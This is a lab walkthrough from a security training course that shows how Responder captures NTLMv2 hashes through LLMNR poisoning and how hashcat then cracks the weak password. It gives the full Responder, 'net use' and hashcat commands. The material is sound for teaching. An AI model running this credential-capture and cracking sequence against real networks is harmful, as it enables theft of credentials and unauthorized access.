![image](/FilesForLabs/images/blueantisyphon.png)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---

# Responder
### Lab Objective

In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a **weak** password.

Specifically, we are looking to take advantage of **"LLMNR"**.  
<hr>

## Step 1: Starting Responder
To begin, **Double-click** `Ubuntu Shell` on the desktop.

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />


Next, we will navigate to the **Responder** directory:

```bash
cd ~/Intro_To_Security/Responder/
```

Now let’s start **Responder**:

```bash
responder -I ens5
```

You should see this:

<img width="313" height="541" alt="resp" src="https://github.com/user-attachments/assets/ca8c62ef-e845-4ad2-8a2a-59102a1e5d6d" />

<br>

### File Explorer String
Let's open **Windows File Explorer** and put in the string ```\\Linux-IP\Noooo``` into the address bar at the top.

>[!Note]
>
>If you don't know your Linux IP, look at the header of your terminal! You should see it there!


<img width="502" height="55" alt="OpeningFileExplorer" src="https://github.com/user-attachments/assets/2de27ae0-5e58-4488-b7f3-ee6b313bec1e" />

<img width="929" height="488" alt="file_exp" src="https://github.com/user-attachments/assets/002bd08e-5d6a-4b31-9593-1feb0d979d47" />

It will pop up a windows to write the credentials. Fill them with a user of 'admin' and a password of 'password' and switch back to your **Linux** terminal window.

<img width="374" height="337" alt="creds" src="https://github.com/user-attachments/assets/27799627-9ed3-4313-bd39-e7c6a0f841b7" />

<br>

After a few moments, you should see some captured data showing up.  

**Please note there may be an error.  That is OK.**

<img width="911" height="323" alt="file_exp_logs" src="https://github.com/user-attachments/assets/d2e3df52-44a3-4d6f-9ae0-af49c87e3898" />

<br>

### Repeating With Windows Terminal
We can do the same thing from the Windows Terminal by running the following command:

```bash
net use * \\10.10.102.57\share
```

<img width="420" height="225" alt="term_attempt" src="https://github.com/user-attachments/assets/7caad37f-ad48-4bfe-9c01-83f456f3c98f" />

As we can see we have the new captured data showing up.

<img width="910" height="160" alt="testing_log" src="https://github.com/user-attachments/assets/19ba8e38-f46d-4e32-a402-1b036d9aee23" />
<hr>

## Step 2: Hash Cracking
Now, let's crack some hashes!

Back in your Linux system kill your Responder session by pressing `ctrl+c`.

Then, type the following:

```bash
cd ~/Intro_To_Security/Password_Cracking
```

Then, we will crack the NTLMv2 hashes:

```bash
hashcat -a 0 -m 5600 -r /usr/share/hashcat/rules/Incisive-leetspeak.rule ~/Intro_To_Security/Responder/logs/SMB-NTLMv2-SSP-10.10.82.154.txt password.lst
```
Remember!!!!  The IP address in the command will be different!  It should be your Windows systems IP address.  If you do not know it, open a Command Prompt on your Windows system and type 'ipconfig'

It should look like this.

<img width="1110" height="405" alt="image" src="https://github.com/user-attachments/assets/17b24419-6a94-4f99-965f-e386a2374537" />

After a moment it should crack the "easy" password we gave it. When I say moment. It can take a couple minutes.

<img width="1111" height="312" alt="image" src="https://github.com/user-attachments/assets/cae610b8-fc1a-4efe-b5ad-4d0256397ab9" />

Once it has cracked the easy password it is time to kill the session. 

Please press `ctrl+c`.